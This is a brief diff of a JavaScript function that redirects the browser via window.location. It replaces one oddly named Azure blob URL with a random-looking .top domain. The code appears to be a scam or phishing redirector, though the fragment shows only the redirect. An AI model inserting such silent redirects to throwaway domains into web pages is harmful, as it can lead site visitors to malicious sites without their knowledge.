@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://gg555.blob.core.windows.net/hw333/Helowolrd.msim.com";
+		var url="https://hyeiyevverldd.top";
 		window.location=url;
 	}
 }
